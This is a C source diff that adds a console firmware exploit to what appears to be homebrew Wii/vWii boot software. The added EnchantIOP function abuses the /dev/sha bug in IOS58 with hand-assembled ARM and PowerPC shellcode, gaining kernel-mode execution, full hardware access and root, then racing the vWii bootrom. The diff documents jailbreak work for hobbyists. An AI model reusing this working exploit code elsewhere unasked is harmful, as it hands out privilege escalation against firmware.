@@ -32,6 +32,10 @@ enum {
 
 // only let the heap implementation use the first 4MB of MEM1
 void* __myArena1Hi = MEM_PHYSICAL_TO_K0(PHYSADDR_LOAD);
+#ifdef HW_RVL
+// ...and do not touch MEM2
+u32 MALLOC_MEM2 = 0;
+#endif
 
 static GXRModeObj *rmode = NULL;
 
@@ -815,6 +819,188 @@ static void video_encoder_init_vga(void) {
 }
 #endif
 
+#ifdef HW_RVL
+#define mfpvr() ({u32 _rval; \
+		__asm__ __volatile__ ("mfpvr %0" : "=r"(_rval)); _rval;})
+
+// Pwn IOS:
+// - Enforce PPC access to all hardware.
+// - On vWii, reboot PPC and race its bootrom to gain access to the other 2 cores.
+//   Cafe OS uses core1 as main core due to its extra cache.
+//   We must use core0 as main core as compat PI only allows core0 interrupts.
+static void EnchantIOP(void) {
+	//printf("PVR = %08x\n", mfpvr());
+	if ((read32(0xCD800064) == 0xFFFFFFFF) ? 1 : 0) {
+		// PPC already has access to all hardware.
+		// If this isn't vWii, no need to do anything.
+		if ((read32(0xCD8005A0) >> 16) != 0xCAFE) return;
+		// If not in broadway compat mode, do nothing.
+		if ((mfpvr() >> 16) != 8) return;
+		//printf("Gaining root...\n");
+	} //else printf("Gaining AHBPROT and IOS root...\n");
+	
+	if (IOS_GetVersion() != 58) {
+		// we want IOS58.
+		IOS_ReloadIOS(58);
+	}
+	
+	// Use the /dev/sha exploit.
+	// Thanks BroadOn for all the bugs :3
+	static u32 stage1[] = {
+		0x4903468D, // ldr r1, =0x10100000; mov sp, r1;
+		0x49034788, // ldr r1, =entrypoint; blx r1;
+		/* Overwrite reserved handler to loop infinitely */
+		0x49036209, // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
+		0x47080000, // bx r1
+		0x10100000, // temporary stack
+		0x41414141, // entrypoint
+		0xFFFF0014, // reserved handler
+	};
+	
+	static u32 iop_kernel_mode[] = {
+		// give PPC access to all hardware
+		0xe3a04536, // mov r4, #0x0D800000
+		0xe3e05000, // mov r5, #0xFFFFFFFF
+		0xe5845064, // str r5, [r4, #0x64]
+		// set PPC uid as root
+		0xe92d4003, // push {r0-r1, lr}
+		0xe3a0000f, // mov r0, #15 ; PROCESS_ID_PPCIPC
+		0xe3a01000, // mov r1, #0 ; USER_ID_ROOT
+		0xe6000570, // syscall IOS_SetUid
+		0xe8bd4003, // pop {r0-r1, lr}
+		0xe12fff1e, // bx lr
+	};
+	
+	// We don't care about the very start of memory.
+	// (Napa/Splash size is at offset 0x28, we aren't overwriting that much)
+	u32* napa = (u32*)0x80000000;
+	u32* ddr = (u32*)0x91000000;
+	memcpy(napa, stage1, sizeof(stage1));
+	napa[5] = (u32)MEM_K0_TO_PHYSICAL(iop_kernel_mode);
+	DCFlushRange(napa, 0x20);
+	
+	int hSha = IOS_Open("/dev/sha", IPC_OPEN_NONE);
+	if (hSha < 0) return;
+	
+	ioctlv vec[3] = {0};
+	vec[1].data = (void*)0xfffe0028;
+	vec[2].data = MEM_K0_TO_PHYSICAL(0x80000000);
+	vec[2].len = 0x20;
+	
+	// broadon was cursed to never write secure code, amirite
+	IOS_Ioctlv(hSha, 0, 1, 2, vec);
+	// wait for context switch to idle thread
+	sleep(1);
+	IOS_Close(hSha);
+	
+	// make sure it worked
+	if (read32(0xCD800064) != 0xFFFFFFFF) {
+		return;
+	}
+	
+	// do more only if in wiimode on cafe
+	if ((read32(0xCD8005A0) >> 16) != 0xCAFE) {
+		return;
+	}
+	
+	// read ancast into memory.
+	// 0x3f100 bytes at offset 0x500, to physaddr 0x01230000
+	// arm payload will copy to 0x01330000
+	const char ancast_path[] = "/title/00000001/00000200/content/00000003.app";
+	int hAncast = IOS_Open(ancast_path, IPC_OPEN_READ);
+	if (hAncast < 0) return;
+	bool ancastSuccess = false;
+	do {
+		if (IOS_Seek(hAncast, 0x500, 0) < 0) break;
+		if (IOS_Read(hAncast, (void*)0x81230000, 0x3f100) != 0x3f100) break;
+		if (read32(0xc1230000) != 0xefa282d9) break;
+		ancastSuccess = true;
+	} while (0);
+	IOS_Close(hAncast);
+	if (!ancastSuccess) {
+		return;
+	}
+	
+	// first up, restart IOS to ensure icache + dcache are wiped
+	// we lose root, but we only needed it to read the ancast image so...
+	// Get IOS current version
+	s32 ios = IOS_GetVersion();
+	if (ios < 0) ios = IOS_GetPreferredVersion();
+	if (ios >= 3) {
+		// Patch to always set AHBPROT on loading TMD
+		patch_ahbprot_reset();
+		// reload IOS, get rid of our existing environment
+		// try IOS58 first then fall back
+		if (ios == 58 || IOS_ReloadIOS(58) < 0) IOS_ReloadIOS(ios);
+		// and patch again, in case we reload again
+		patch_ahbprot_reset();
+	}
+	
+	// make sure ios version is correct
+	if (read32(0xC0003140) != 0x3a1920) {
+		return;
+	}
+	// get ARM kernel mode code execution again,
+	// this time to race the PPC bootrom and get espresso-mode code execution
+	
+	static u32 iop_kernel_mode_restart_ppc[] = {
+		#include "ppc_race_payload.inc"
+	};
+
+	static u32 ppc_payload_write[] = {
+		0x38800000, // li r4, 0
+		0x90840000, // stw r4, 0(r4)
+		0x7c0420ac, // dcbf r4, r4
+		0x7c0004ac, // sync
+	};
+	
+	static u32 ppc_payload[] = {
+		0x38600000 | (0x4000 - sizeof(ppc_payload_write)), // li r3, x
+		0x38800000, // li r4, 0
+		0x7c7a03a6, // mtsrr0 r3
+		0x7c9b03a6, // mtsrr1 r4
+		0x4c000064, // rfi
+		0x48000000, // b .
+		0x60000000, // nop
+	};
+	
+	memcpy(ddr, iop_kernel_mode_restart_ppc, sizeof(iop_kernel_mode_restart_ppc));
+	memcpy((void*)0x81320000, ppc_payload, sizeof(ppc_payload));
+	memcpy((void*)(0x80004000 - sizeof(ppc_payload_write)), ppc_payload_write, sizeof(ppc_payload_write));
+	memset((void*)0x816fffe0, 0, 0x20);
+
+	memcpy(napa, stage1, sizeof(stage1));
+	napa[5] = (u32)MEM_K0_TO_PHYSICAL(ddr);
+	DCFlushRange(napa, 0x20);
+	DCFlushRange(ddr, ((sizeof(iop_kernel_mode_restart_ppc) / 0x20) + 1) * 0x20);
+	DCFlushRange((void*)0x81320000, 0x100);
+	DCFlushRange((void*)0x816fffe0, 0x20);
+	DCFlushRange((void*)(0x80004000 - sizeof(ppc_payload_write)), 0x20);
+	
+	// run exploit to reset ppc
+	hSha = IOS_Open("/dev/sha", IPC_OPEN_NONE);
+	if (hSha < 0) return;
+	ioctlv vec2[3] = {0};
+	vec2[1].data = (void*)0xfffe0028;
+	vec2[2].data = MEM_K0_TO_PHYSICAL(0x80000000);
+	vec2[2].len = 0x20;
+	
+	// wait for ios to fully come up
+	sleep(1);
+	
+	// close libogc IOS handles
+	__IOS_ShutdownSubsystems();
+	
+	
+	
+	// bye bye
+	IOS_Ioctlv(hSha, 0, 1, 2, vec2);
+	// just hang until pwned IOP puts this cpu back into reset
+	while (1);
+}
+
+#endif
+
 int main(int argc, char** argv) {
 	// Initialise the video system
 	VIDEO_Init();
@@ -839,6 +1025,13 @@ int main(int argc, char** argv) {
 			id0 == 0xFF800000;
 	}
 	if (isRva) rmode = &TVNtsc480Prog;
+	
+	if (*(PULONG)0x80001800 == 0 && *(PULONG)0x80001804 == 'STUB') {
+		// Do not try to run an IOS exploit if this isn't real hardware.
+	} else {
+		// Cast a spell on the IOP, we want more than what it's given us
+		EnchantIOP();
+	}
 	#endif
 	
 	// Get size of Splash/Napa (MEM1), DDR (MEM2)
